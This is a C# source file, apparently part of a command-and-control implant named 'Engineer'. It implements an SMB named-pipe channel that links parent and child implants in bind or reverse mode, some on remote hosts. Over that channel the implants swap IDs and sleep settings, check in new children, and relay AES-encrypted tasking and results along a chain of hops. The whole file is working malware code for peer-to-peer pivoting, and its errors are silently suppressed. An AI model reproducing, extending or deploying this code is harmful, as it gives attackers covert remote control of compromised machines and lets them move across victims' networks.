using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO.Pipes;
using System.IO;
using System.Collections.Concurrent;
using System.Net;
using System.Threading;
using System.Security.Cryptography;
using Engineer.Commands;
using Engineer.Functions;
using DynamicEngLoading;

namespace Engineer.Models
{
    public class EngSMBComm : EngCommBase
    {
        private static string NamedPipe { get; set; }
        public bool IsServer { get; set; }
        public bool IsClient { get; set; }
        public bool IsParent { get; set; }
        private IPAddress Bindip { get; set; }   //where to connect when SMBComm is the client on a child so at startup it knows where to go. 

        public static bool IsDataInTransit { get; set; } = false; // true when data is being read / written 

        public ConnectionMode connectionMode { get; set; } // always means direction of parent -> child 
        public static readonly ConcurrentDictionary<string, ConcurrentQueue<byte[]>> ParentToChildData = new(); //key is a unique id for the child, value is a queue of data to send to the child should be C2TaskMessages
        public static readonly ConcurrentDictionary<string, ConcurrentQueue<byte[]>> ChildToParentData = new(); // key is a unique id for the parent, value is a queue of data to send to the parent should be TaskResponse Array
        internal CancellationTokenSource _tokenSource = new();
        public string ChildIdString { get; set; }

        public enum ConnectionMode
        {
            bind,
            reverse
        }

        public EngSMBComm(string namedPipe,bool isParent) //server 
        {
            IsParent = isParent;
            NamedPipe = namedPipe;
            if (isParent)
            {
                connectionMode = ConnectionMode.reverse; // if this is the parent & a server, then parent -> child, is a reverse connection type
            }
            else if (!isParent)
            {
                connectionMode = ConnectionMode.bind; // if this is the child engineer & a server, then the parent -> child, is a bind connection type
            }
            IsServer = true;
        }
        public EngSMBComm(string namedPipe,string bindip, bool isParent) //client
        {
            IsParent = isParent;
            NamedPipe = namedPipe;
            Bindip = IPAddress.Parse(bindip);
            if (isParent)
            {
                connectionMode = ConnectionMode.bind; // if this is the parent & a client, then parent -> child, is a bind connection type
            }
            else if (!isParent)
            {
                connectionMode = ConnectionMode.reverse; // if this is the child engineer & a client, parent -> child, is a reverse connection type
            }
            IsClient = true;
        }

        public override async Task Start()
        {
            if (IsClient)
            {
                if (IsParent)
                {
                    //Console.WriteLine("starting parent client");
                    Task.Run(async () => await Start_ParentClient()); //only started via the Connect command 
                }
                else if (!IsParent)
                {
                   // Console.WriteLine("starting child client");
                    Task.Run(async () => await Start_ChildClient()); // only started when the engineer is created
                }
            }
            else if (IsServer)
            {
                if (IsParent)
                {
                    //Console.WriteLine("starting parent server");
                    Task.Run(async () => await Start_ParentServer()); //only started via the Connect command 

                }
                else if (!IsParent)
                {
                   // Console.WriteLine("starting child server");
                    Task.Run(async () => await Start_ChildServer()); // only started when the engineer is created
                }
            }
        }

        public async Task Start_ParentServer()
        {
            try
            {
                //make an NamedPipe server and wait for a client connection
                NamedPipeServerStream pipeServer = new NamedPipeServerStream(NamedPipe, PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
               // Console.WriteLine($"starting server on named pipe {NamedPipe}");
                Link.Output = $"starting server on named pipe {NamedPipe}";
                while (!_tokenSource.Token.IsCancellationRequested)
                {
                    pipeServer.WaitForConnection();
                    //if pipeserver client is connected, start 2 Task.Runs one reading and one writing to the client 
                    byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
                    byte[] Sleep = BitConverter.GetBytes(EngCommBase.Sleep);
                    byte[] IdSleep = Id.Concat(Sleep).ToArray();
                    await pipeServer.WriteAsync(IdSleep, 0, IdSleep.Length);
                    byte[] ChildId = new byte[36];
                    await pipeServer.ReadAsync(ChildId,0,36);
                    ChildIdString = Encoding.ASCII.GetString(ChildId);
                    Program.SmbChildCommModules.TryAdd(ChildIdString, this);
                    ParentToChildData.TryAdd(ChildIdString, new ConcurrentQueue<byte[]>());
                    var readPipeTask =  Task.Run(async () => await ReadFromPipe(pipeServer));
                    var writePipeTask = Task.Run(async () => await WriteToPipe(pipeServer));
                    // block whilst tasks are running
                    await Task.WhenAll(readPipeTask, writePipeTask);
                }
            }
            catch (Exception e)
            {
              //  Console.WriteLine(e.Message);
               // Console.WriteLine(e.StackTrace);
            }
            
            //Console.WriteLine("THIS SHOULD NOT PRINT");
        }

        public async Task Start_ParentClient()
        {
            try
            {
                NamedPipeClientStream pipeClient = new NamedPipeClientStream(Bindip.ToString(), NamedPipe, PipeDirection.InOut, PipeOptions.Asynchronous);
              //  Console.WriteLine($"trying to connect to {Bindip} on named pipe {NamedPipe}");
                pipeClient.Connect(10000);
                if (pipeClient.IsConnected)
                {
                   // Console.WriteLine($"connected to {Bindip} on named pipe {NamedPipe}");
                    Link.Output = $"connected to {Bindip} on named pipe {NamedPipe}";
                    //if pipeserver client is connected, start 2 Task.Runs one reading and one writing to the client 
                    byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
                    byte[] Sleep = BitConverter.GetBytes(EngCommBase.Sleep);
                    byte[] IdSleep = Id.Concat(Sleep).ToArray();
                   // Console.WriteLine($"sending {IdSleep.Length} bytes");
                    await pipeClient.WriteAsync(IdSleep, 0, IdSleep.Length);
                    byte[] ChildId = new byte[36];
                    await pipeClient.ReadAsync(ChildId, 0, 36);
                    ChildIdString = Encoding.ASCII.GetString(ChildId);
                    //Console.WriteLine($"got back child id {ChildIdString}");
                    Program.SmbChildCommModules.TryAdd(ChildIdString, this);
                    ParentToChildData.TryAdd(ChildIdString, new ConcurrentQueue<byte[]>());
                    var readPipeTask = Task.Run(async () => await ReadFromPipe(pipeClient));
                    var writePipeTask = Task.Run(async () => await WriteToPipe(pipeClient));
                    // block whilst tasks are running
                    await Task.WhenAll(readPipeTask, writePipeTask);
                }
            }
            catch (Exception e)
            {
               // Console.WriteLine(e.Message);
               // Console.WriteLine(e.StackTrace);
            }
           // Console.WriteLine("THIS SHOULD NOT PRINT");
        }

        public async Task Start_ChildServer()
        {
            try
            {
                //make an NamedPipe server and wait for a client connection
                NamedPipeServerStream pipeServer = new NamedPipeServerStream(NamedPipe, PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
               // Console.WriteLine($"starting server on named pipe {NamedPipe}");
                Link.Output = $"starting server on named pipe {NamedPipe}";
                pipeServer.WaitForConnection();
                while (!_tokenSource.Token.IsCancellationRequested)
                {
                    byte[] ParentIdSleep = new byte[40];
                    await pipeServer.ReadAsync(ParentIdSleep, 0, 40);
                    byte[] ParentId = ParentIdSleep.Take(36).ToArray();
                    byte[] Sleep = ParentIdSleep.Skip(36).Take(4).ToArray();
                    string ParentIdString = Encoding.ASCII.GetString(ParentId);
                   // Console.WriteLine($"got back parent id byte size of {ParentId.Length}");
                   // Console.WriteLine($"got back parent id {ParentIdString}");
                    EngCommBase.Sleep = BitConverter.ToInt32(Sleep, 0);
                  //  Console.WriteLine($"got back parent sleep value {EngCommBase.Sleep}");
                    if(Program.SmbParentCommModules.TryAdd(ParentIdString, this))
                    {
                       // Console.WriteLine("added parent id to the smb Parent comm moudle list");
                    }
                    ChildToParentData.TryAdd(ParentIdString, new ConcurrentQueue<byte[]>());
                    var firstCheckTask = new EngineerTask
                    {
                        Id = Guid.NewGuid().ToString(),
                        Command = "P2PFirstTimeCheckIn",
                        Arguments = new Dictionary<string, string> {
                                { "/parentid", ParentIdString }
                            },
                        IsBlocking = true
                    };
                    await Task.Run(async () => await Tasking.DealWithTask(firstCheckTask));
                    byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
                    await pipeServer.WriteAsync(Id, 0, Id.Length);
                    var readPipeTask = Task.Run(async () => await ReadFromPipe(pipeServer));
                    var writePipeTask = Task.Run(async () => await WriteToPipe(pipeServer));
                    // block whilst tasks are running
                    if (pipeServer.IsConnected)
                    {
                        IsChildConnectedToParent = true;
                    }
                    else if (!pipeServer.IsConnected)
                    {
                        IsChildConnectedToParent = false;
                    }
                    await Task.WhenAll(readPipeTask, writePipeTask);
                }
            }
            catch (Exception e)
            {
               // Console.WriteLine(e.Message);
               // Console.WriteLine(e.StackTrace);
            }
            
            //Console.WriteLine("THIS SHOULD NOT PRINT");
        }

        public async Task Start_ChildClient()
        {
            try
            {
                NamedPipeClientStream pipeClient = new NamedPipeClientStream(Bindip.ToString(), NamedPipe, PipeDirection.InOut, PipeOptions.Asynchronous);
                //Console.WriteLine($"trying to connect to {Bindip} on named pipe {NamedPipe}");
                pipeClient.Connect(10000);
                if (pipeClient.IsConnected)
                {
                   // Console.WriteLine($"connected to {Bindip} on named pipe {NamedPipe}");
                    Link.Output = $"connected to {Bindip} on named pipe {NamedPipe}";
                    byte[] ParentIdSleep = new byte[40];
                    await pipeClient.ReadAsync(ParentIdSleep,0,40);
                    byte[] ParentId = ParentIdSleep.Take(36).ToArray();
                    byte[] Sleep = ParentIdSleep.Skip(36).Take(4).ToArray();
                    string ParentIdString = Encoding.ASCII.GetString(ParentId);
                   // Console.WriteLine($"got back parent id byte size of {ParentId.Length}");
                   // Console.WriteLine($"got back parent id {ParentIdString}");
                    EngCommBase.Sleep = BitConverter.ToInt32(Sleep, 0);
                    //Console.WriteLine($"got back parent sleep value {EngCommBase.Sleep}");
                    Program.SmbParentCommModules.TryAdd(ParentIdString, this);
                    ChildToParentData.TryAdd(ParentIdString, new ConcurrentQueue<byte[]>());
                    var firstCheckTask = new EngineerTask
                    {
                        Id = Guid.NewGuid().ToString(),
                        Command = "P2PFirstTimeCheckIn",
                        Arguments = new Dictionary<string, string> {
                                { "/parentid", ParentIdString }
                            },
                        IsBlocking = true
                    };
                    Task.Run(async () => await Tasking.DealWithTask(firstCheckTask));
                    byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
                    await pipeClient.WriteAsync(Id, 0, Id.Length);
                    var readPipeTask = Task.Run(async () => await ReadFromPipe(pipeClient));
                    var writePipeTask = Task.Run(async () => await WriteToPipe(pipeClient));
                    // block whilst tasks are running
                    if (pipeClient.IsConnected)
                    {
                        IsChildConnectedToParent = true;
                    }
                    else if (!pipeClient.IsConnected)
                    {
                        IsChildConnectedToParent = false;
                    }
                    await Task.WhenAll(readPipeTask, writePipeTask);
                }
            }
            catch (Exception e)
            {
               // Console.WriteLine(e.Message);
               // Console.WriteLine(e.StackTrace);
            }
            
           // Console.WriteLine("THIS SHOULD NOT PRINT");
        }

        public async Task ReadFromPipe(PipeStream pipeserver)
        {
           // Console.WriteLine("starting read from pipe loop");
            //read from the named pipe, if the parent is reading from the pipe then this a TaskResponse, if the child is reading from the pipe this is a C2TaskMessage
            try 
            { 
                while(!_tokenSource.IsCancellationRequested)
                {
                    //parent reading from pipe
                    if (IsParent)
                    {
                        byte[] messageSize = new byte[4];
                        await pipeserver.ReadAsync(messageSize, 0, 4);
                        //convert the sizeRead into an int so we know the size of the remaining message if any
                        int size = BitConverter.ToInt32(messageSize, 0);
                        if (size != 0) // should be reading the first 4 bytes for the size
                        {
                            IsDataInTransit = true;
                            byte[] ChildData = new byte[size];
                            await pipeserver.ReadAsync(ChildData, 0, size); // should always be a TaskResponse[] , but the data is seralized & encrypted 
                            if (Program.SmbParentCommModules.Count() > 0) //if not this is the http Eng and this data can be queued to go to its parent 
                            {
                                ChildToParentData[Program.SmbParentCommModules.Keys.ElementAt(0)].Enqueue(ChildData); // this should be the current engineers only parent, if this value exists we are pushing data up the chain.
                            }
                            else
                            {
                                //else queue this data to be send back from http to ts
                                //Program.OutboundResponsesSent += 1;
                                await Program._commModule.P2PSent(ChildData); // need an SMB version ? 
                                IsDataInTransit = false;
                            }
                        }
                    }
                    else if(!IsParent)
                    {
                        byte[] messageSize = new byte[4];
                        await pipeserver.ReadAsync(messageSize, 0, 4);
                        //convert the sizeRead into an int so we know the size of the remaining message if any
                        int size = BitConverter.ToInt32(messageSize, 0);
                        if (size != 0) // should be reading the first 4 bytes for the size
                        {
                            IsDataInTransit = true;
                            byte[] ParentData = new byte[size];
                            await pipeserver.ReadAsync(ParentData, 0, size); // should always be a C2TaskMessage[] , but the data is seralized & encrypted 
                            byte[] seralizedParentData = Encryption.AES_Decrypt(ParentData,Program.MessagePathKey);
                            C2TaskMessage incomingMessage = seralizedParentData.JsonDeserialize<C2TaskMessage>();
                            //check the C2TaskMessage PathMessage Count if its highrt then 0, read the first item and if that matches the current engineers id add the message to the queue
                            if (incomingMessage.PathMessage.ElementAt(0) == Program._metadata.Id)
                            {
                                incomingMessage.PathMessage.RemoveAt(0);
                                if (incomingMessage.PathMessage.Count > 0)
                                {
                                    // when child reads this if it has more pathing info then this task is meant for one of its children and it should get it ready to send onward. 
                                    var childid = incomingMessage.PathMessage[0];
                                    var seeralizedMessage = incomingMessage.JsonSerialize();
                                    var EncryptedMessage = Encryption.AES_Encrypt(seeralizedMessage,Program.MessagePathKey);
                                    ParentToChildData[childid].Enqueue(EncryptedMessage);
                                }
                                //else this task is for this current engineer and should be added to the taskQueue
                                else
                                {
                                    byte[] decryptedTaskData = Encryption.AES_Decrypt(incomingMessage.TaskData.ToArray(), "", Program.UniqueTaskKey);
                                    HandleResponse(decryptedTaskData);
                                    IsDataInTransit = false;
                                }
                            }
                        }
                    }
                    await Task.Delay(10);
                }
            }
            catch(Exception ex)
            {
               // Console.WriteLine(ex.Message);
               // Console.WriteLine(ex.StackTrace);
            }
           // Console.WriteLine("exiting read from pipe loop");
        }
        
        public async Task WriteToPipe(PipeStream pipeserver)
        {
            //Console.WriteLine("starting write to pipe loop");
            //write into the named pipe, if the parent is writing into the pipe this is a C2TaskMessage, if the child is writing into the pipe this is a TaskResponse
            try
            {
                while (!_tokenSource.IsCancellationRequested)
                {
                    if (IsParent)
                    {
                        //parent writing an Encrypted C2TaskMessage to children
                        if (ParentToChildData.TryGetValue(ChildIdString, out ConcurrentQueue<byte[]> data))
                        {
                            if (data.TryDequeue(out byte[] message))
                            {
                                IsDataInTransit = true;
                                byte[] size = BitConverter.GetBytes(message.Length);
                                byte[] ComboMessage = size.Concat(message).ToArray();
                                await pipeserver.WriteAsync(ComboMessage, 0, ComboMessage.Length);
                                IsDataInTransit = false;
                            }
                        }
                    }
                    //child writing to parent should be a TaskResponse 
                    if (ChildToParentData.TryGetValue(Program._metadata.Id, out ConcurrentQueue<byte[]> childdata))
                    {
                        if (childdata.TryDequeue(out byte[] message))
                        {
                            IsDataInTransit = true;
                           // Console.WriteLine("calling send data to parent for self");
                            byte[] size = BitConverter.GetBytes(message.Length);
                            byte[] ComboMessage = size.Concat(message).ToArray();
                            await pipeserver.WriteAsync(ComboMessage, 0, ComboMessage.Length);
                            IsDataInTransit = false;
                        }
                    }
                    if (!IsParent && Program.SmbParentCommModules.Count() > 0)
                    {
                        if (ChildToParentData.ContainsKey(Program.SmbParentCommModules.Keys.ElementAt(0)))
                        {
                            //Console.WriteLine("child to parent data holds parent id");
                            //if the ChildToParentData dictionary has values for the parent Id , send the data to the parent
                            if (ChildToParentData[Program.SmbParentCommModules.Keys.ElementAt(0)].TryDequeue(out byte[] ForwardedChildData))
                            {
                                //Console.WriteLine("calling send data to parent");
                                IsDataInTransit = true;
                                //concat the size of the message to the front of the message
                                byte[] size = BitConverter.GetBytes(ForwardedChildData.Length);
                                byte[] message = size.Concat(ForwardedChildData).ToArray();
                                await pipeserver.WriteAsync(message, 0, message.Length);
                                IsDataInTransit = false;
                            }
                        }
                    }
                    await Task.Delay(10);
                }
            }
            catch(Exception ex)
            {
               // Console.WriteLine(ex.Message);
              //  Console.WriteLine(ex.StackTrace);
            }
           // Console.WriteLine("exiting write to pipe loop");
        }

        

        public override void Stop()
        {
           
        }

        public override async Task CheckIn()
        {}

        public override async Task PostData()
        {}

        private bool HandleResponse(byte[] response) //if not null we have stuff to do 
        {
            var tasks = response.JsonDeserialize<List<EngineerTask>>();

            if (tasks != null && tasks.Any())
            {
                foreach (var task in tasks)
                {
                    Inbound.Enqueue(task);
                }
                return true;
            }
            return false;
        }

    }
}
